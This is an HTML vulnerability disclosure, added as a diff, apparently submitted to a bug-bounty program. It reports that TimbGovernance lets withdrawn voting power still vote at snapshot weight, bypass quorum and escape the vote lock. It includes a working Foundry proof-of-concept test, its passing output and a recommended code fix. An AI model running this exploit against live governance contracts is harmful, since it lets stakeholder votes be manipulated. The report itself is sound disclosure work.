@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>TimbSwap report 1</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    svg {
+      height: auto;
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">TimbGovernance: withdrawn voting power still votes at
+full weight, escapes the vote lock, and is removed from the quorum
+base</h1>
+</header>
+<h1
+id="timbgovernance-withdrawn-voting-power-still-votes-at-full-weight-escapes-the-vote-lock-and-is-removed-from-the-quorum-base">TimbGovernance:
+withdrawn voting power still votes at full weight, escapes the vote
+lock, and is removed from the quorum base</h1>
+<p><strong>Reporter:</strong> Ramprasad Edigi (Ram)
+<strong>Contract:</strong> <code>TimbGovernance</code> (mainnet source,
+<code>contracts/TimbGovernance.sol</code>,
+github.com/0xTimberZx/TimbSwap, commit <code>3e97004</code>)
+<strong>Listed deployment:</strong> Arbitrum One
+<code>0x26d1e27132d1d5cdb449d641938c7da26cd5be63</code> (see note on
+deployed build below) <strong>Suggested tier:</strong> T3,
+off-chain-signalling governance manipulation (voting-power / quorum
+bypass), per the repository SECURITY.md table <strong>Not a duplicate
+of:</strong> TS-021, TS-034, TS-040. This is the interaction between the
+TS-021 and TS-034 fixes.</p>
+<h2 id="summary">Summary</h2>
+<p>Since TS-034, <code>castVote</code> weighs a vote by
+<code>votingPowerAt(voter, p.createdAt)</code>, the creation snapshot.
+It never checks that the power is still deposited.</p>
+<p>Since TS-021, every <code>withdrawVotingPower</code> ratchets each
+open proposal’s <code>totalVotingPower</code> (the quorum base) down to
+the live total.</p>
+<p>So a holder who had power at creation can:</p>
+<ol type="1">
+<li>withdraw everything right after the proposal is created (no lock
+exists yet, because they have not voted),</li>
+<li>get the tokens back and sell or move them,</li>
+<li>still vote later with the full snapshot weight.</li>
+</ol>
+<p>The same power is removed from the quorum base and still counted in
+the votes. <code>votingLockUntil</code> is set on the vote, but it
+guards a balance that is already zero, so the “votes stay locked until
+the execution deadline” guarantee (audit M6) does not hold.</p>
+<h2 id="root-cause">Root cause</h2>
+<pre class="solidity"><code>// castVote
+uint256 power = votingPowerAt(msg.sender, p.createdAt);   // snapshot only
+if (power == 0) revert InsufficientVotingPower();
+...
+if (p.executionDeadline &gt; votingLockUntil[msg.sender]) {
+    votingLockUntil[msg.sender] = p.executionDeadline;    // locks a 0 balance
+}
+
+// withdrawVotingPower
+uint256 lockedUntil = votingLockUntil[voter];             // 0 before voting
+...
+_sweepOpenProposals(true);  // TS-021: base ratchets down to live total</code></pre>
+<p>The snapshot answers “did you hold power at creation”, but not “do
+you still hold it”. The lock only works if the vote comes before the
+withdrawal, and nothing enforces that order.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Quorum bypass.</strong> Withdrawn power drops out of the
+denominator but still counts in the numerator. In the PoC, with the
+repo’s own test parameters (4% quorum), a proposal backed by 3.9% of
+creation power passes. It would fail if the backer kept the
+deposit.</li>
+<li><strong>Votes above 100% of the base.</strong> If whales exit and
+then vote, <code>forVotes</code> can be many times
+<code>p.totalVotingPower</code> (90e18 votes against a 1e18 base in the
+PoC).</li>
+<li><strong>Zero-stake voting.</strong> A wallet that has sold its whole
+position fully cancels a holder who stayed and is locked (50e18 vs 50e18
+in the PoC).</li>
+<li><strong>Vote lock defeated.</strong> Voters keep no skin in the game
+through <code>executionDeadline</code>. “Vote and dump” works on every
+open proposal.</li>
+</ul>
+<p>Governance is signalling-only during the beta: execution is
+owner-gated and real authority is the timelock and multisig. So no funds
+are directly at risk. That is why this is filed as T3, the tier the
+program names for voting-power and quorum bypass.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>A Foundry test runs against an unmodified copy of
+<code>contracts/TimbGovernance.sol</code> from commit
+<code>3e97004</code>, using the same constructor parameters as
+<code>tests/TimbGovernance.t.sol</code> (threshold 1,000e18, quorum 400
+bps, 3 day period, 1 day delay). Everything runs locally. No
+transactions were sent to any network.</p>
+<p><code>test/GovWithdrawThenVote.t.sol</code>:</p>
+<pre class="solidity"><code>function test_exploit_withdrawThenVote_passesBelowQuorum_unlocked() public {
+    _deposit(honest, 95e18);
+    _deposit(attacker, 3.9e18);
+    _deposit(address(0xD00D), 1.1e18);
+    uint256 pid = gov.createProposal(&quot;p&quot;, &quot;d&quot;);    // base 100e18, quorum 4e18
+
+    vm.prank(attacker);
+    gov.withdrawVotingPower(3.9e18);               // base ratchets to 96.1e18
+    vm.prank(attacker);
+    timbs.transfer(buyer, 3.9e18);                 // tokens sold
+    assertEq(gov.votingPowerDeposited(attacker), 0);
+
+    vm.warp(block.timestamp + VOTING_DELAY + 1);
+    vm.prank(attacker);
+    gov.castVote(pid, true);                       // counts 3.9e18
+    // quorum 4% of 96.1e18 = 3.844e18 &lt;= 3.9e18
+
+    vm.warp(block.timestamp + VOTING_PERIOD + 1);
+    gov.executeProposal(pid);                      // Passed -&gt; Executed
+}</code></pre>
+<p>The same file also contains:</p>
+<ul>
+<li><code>test_baseline_keepDeposit_failsQuorum_andIsLocked</code>: the
+same voter who keeps the deposit fails quorum and cannot withdraw.</li>
+<li><code>test_exploit_votesExceedBase</code>: 90e18 FOR against a
+quorum base of 1e18, with every voter holding 0 deposited.</li>
+<li><code>test_exploit_exitedPowerOutvotesRemainingHolders</code>: a
+zero-stake wallet ties a locked 50e18 AGAINST vote.</li>
+</ul>
+<p>Result:</p>
+<pre><code>[PASS] test_baseline_keepDeposit_failsQuorum_andIsLocked()
+[PASS] test_exploit_exitedPowerOutvotesRemainingHolders()
+[PASS] test_exploit_votesExceedBase()
+[PASS] test_exploit_withdrawThenVote_passesBelowQuorum_unlocked()
+Suite result: ok. 4 passed; 0 failed</code></pre>
+<p>Run:
+<code>forge test --match-path test/GovWithdrawThenVote.t.sol -vv</code>
+(solc 0.8.24, via_ir, optimizer 200, cancun, as in the repo
+foundry.toml).</p>
+<h2 id="recommended-fix">Recommended fix</h2>
+<p>Count only power that is both held at creation and still deposited,
+so that the vote lock actually covers what was counted:</p>
+<pre class="solidity"><code>uint256 power = votingPowerAt(msg.sender, p.createdAt);
+uint256 held  = votingPowerDeposited[msg.sender];
+if (held &lt; power) power = held;
+if (power == 0) revert InsufficientVotingPower();</code></pre>
+<p>This keeps TS-034, because a deposit made after creation still has a
+snapshot of 0. It keeps TS-021, because the ratchet is unchanged. It
+also closes the gap: once the voter votes, the counted amount is locked
+until <code>executionDeadline</code>.</p>
+<p><code>test/GovFix.t.sol</code> applies exactly this change. All three
+tests pass:</p>
+<ul>
+<li>withdrawn power reverts with
+<code>InsufficientVotingPower</code></li>
+<li>a late deposit still cannot vote</li>
+<li>an honest holder votes and is locked</li>
+</ul>
+<p>An alternative is to lock power at proposal creation for anyone who
+held it. That is heavier and blocks honest exits, so the
+<code>min</code> above is the smaller change.</p>
+<h2 id="note-on-the-deployed-build">Note on the deployed build</h2>
+<p>A read-only <code>eth_getCode</code> on
+<code>0x26d1e27132d1d5cdb449d641938c7da26cd5be63</code> (Arbitrum One)
+shows bytecode without the <code>openProposalCount()</code> /
+<code>votingPowerAt(address,uint256)</code> selectors. So the live
+contract predates the TS-021 and TS-034 fixes. It currently reports
+<code>proposalCount() = 0</code> and
+<code>totalVotingPower() = 0</code>.</p>
+<p>This issue is in the current mainnet source that carries those fixes,
+which is the build the program says will replace it. It was reported the
+same way as TS-021, TS-034 and TS-040, which are tagged “(mainnet)” and
+were fixed in source. If the program only pays for the deployed
+bytecode, please treat this as a fix review of TS-021 and TS-034.</p>
+</body>
+</html>
